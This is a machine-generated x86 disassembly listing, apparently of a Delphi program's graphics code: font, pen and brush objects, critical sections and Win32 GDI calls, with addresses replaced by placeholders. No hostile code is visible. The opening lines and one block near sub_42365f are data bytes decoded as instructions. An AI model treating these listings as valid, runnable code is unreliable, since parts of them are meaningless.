add eax 0x6f634954
outsb
cld
sub al [ edx ]
mov [ eax ] ch
inc edx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp + 0x42 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2b ] ah
inc edx
add [ eax + eax ] dh
imul esp [ ebx + 0x73 ] 0xc08b0000
mov al [ 0x422a ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp + 0x180042 ] ah
add [ eax ] al
lodsb [ esi ]
sub [ edx ] al
mov al [ 0xffffffffac004034 ]
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
inc eax
add [ eax - 0x75 ] al
inc edx
add [ eax - 0x75 ] dh
inc edx
add [ edx ] cl
push esp
dec ecx
arpl [ edi + 0x6e ] bp
dec ecx
insd
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x4229b870
add [ eax + 0x4228 ] cl
add [ eax ] cl
inc edi
jb r-xdata
sub al [ edx ]
pop es
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_422c10
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_422c4c
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_422c88
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_422bfc
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_422c70
xor edx edx
push ebp
push sub_422d5c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422d63
mov eax [ ebp - 0x4 ]
call sub_422c7c
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_4026f4
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_4028f0
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_407e6c
test al al
je r-xdata
sub_422d6c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_422c70
xor ecx ecx
push ebp
push sub_422df3
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_422c7c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_422e1c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_422c70
xor eax eax
push ebp
push sub_422e85
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_422c88
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_422d6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422e8c
mov eax [ ebp - 0x4 ]
call sub_422c7c
retn
mov eax ebx
mov si 0xfffd
call sub_40346c
sub_422e94
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_422c70
xor eax eax
push ebp
push sub_422ef0
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422ef7
mov eax [ ebp - 0x4 ]
call sub_422c7c
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_40346c
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_422d6c
sub_422f00
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_422c70
xor edx edx
push ebp
push sub_422f5f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422f66
mov eax [ ebp - 0x4 ]
call sub_422c7c
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_422f6c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_418914
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_423009
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_418550
mov ebx eax
mov eax ebx
call sub_42482c
inc [ ebp - 0x4 ]
mov eax ebx
call sub_424b40
mov eax [ rw-data ]
call sub_422f00
mov eax [ rw-data ]
call sub_422f00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423010
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_418978
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_418550
call sub_424a18
inc esi
dec ebx
jne r-xdata
sub_42365f
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_417e74
retn
sub_423690
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_402d84
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_402b74
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_423744
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_422c88
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_423798
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_422d6c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_4237dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418b4c
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_42349c
xor eax eax
push ebp
push sub_423897
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_42349c
xor eax eax
push ebp
push sub_42387a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422e94
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_423918
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423881
mov eax [ ebp - 0x8 ]
call sub_4234ac
retn
mov eax ebx
call sub_423b9c
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_423bb8
sub_4238c8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42349c
xor eax eax
push ebp
push sub_42390d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422e1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423914
mov eax [ ebp - 0x4 ]
call sub_4234ac
retn
sub_42392c
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_423ab5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423abc
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_40400c
retn
mov eax [ rw-data ]
call sub_422c70
xor eax eax
push ebp
push sub_423a8d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_422c7c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_40424c
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_408778
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_40424c
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_408778
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_40424c
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_407f3c
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_423c10
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_423ad4
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_423690
mov edx esp
mov eax ebx
call sub_4238c8
add esp 0x2c
pop esi
pop ebx
retn
sub_423b00
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_4238b0
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_4238c8
add esp 0x2c
pop esi
pop ebx
retn
sub_423b40
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_4238b0
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402c84
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_404284
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_402b74
mov edx esp
mov eax ebx
call sub_4238c8
sub_423bb8
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call MulDiv
mov edx eax
neg edx
mov eax ebx
call sub_423b00
pop esi
pop ebx
retn
sub_423be4
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_4238b0
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_4238c8
add esp 0x30
pop ebx
retn
sub_423c18
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_4238b0
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_4238c8
add esp 0x2c
pop esi
pop ebx
retn
sub_423c48
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_4238b0
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_4238c8
add esp 0x2c
pop esi
pop ebx
retn
sub_423c70
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_422c88
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_423cb4
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_422d6c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_423cdc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418b4c
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_42349c
xor eax eax
push ebp
push sub_423d7b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_42349c
xor eax eax
push ebp
push sub_423d5e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422e94
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_423ec4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423d65
mov eax [ ebp - 0x8 ]
call sub_4234ac
retn
sub_423d94
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_423dac
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42349c
xor eax eax
push ebp
push sub_423df1
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422e1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423df8
mov eax [ ebp - 0x4 ]
call sub_4234ac
retn
sub_423e04
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_423d94
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_423dac
add esp 0x10
pop esi
pop ebx
retn
sub_423e2c
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_422c70
xor eax eax
push ebp
push sub_423eb2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_422c7c
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_423458
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_423ee0
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_423d94
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_423dac
add esp 0x10
pop esi
pop ebx
retn
sub_423f10
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_423d94
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_423dac
sub_423f3c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_422c88
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_423f7c
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_422d6c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_423fa4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418b4c
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_42349c
xor eax eax
push ebp
push sub_424034
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_42349c
xor eax eax
push ebp
push sub_424017
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422e94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42401e
mov eax [ ebp - 0x8 ]
call sub_4234ac
retn
sub_42404c
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_424068
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42349c
xor eax eax
push ebp
push sub_4240ad
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422e1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4240b4
mov eax [ ebp - 0x4 ]
call sub_4234ac
retn
sub_4240b8
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_424068
add esp 0x10
pop edi
pop esi
retn
sub_4240e4
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_42404c
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_424068
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_424118
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_422c70
xor edx edx
push ebp
push sub_4241e5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_422c7c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_423458
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_424200
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_42404c
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_424068
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_424234
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403240
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_423744
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_424d68
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423c70
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_424d88
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423f3c
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_424da8
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_41888c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_4242f8
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_418928
xor edx edx
mov eax esi
call sub_424ba0
mov eax [ esi + 0xc ]
call sub_403270
mov eax [ esi + 0x10 ]
call sub_403270
mov eax [ esi + 0x14 ]
call sub_403270
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418b20
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_424354
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
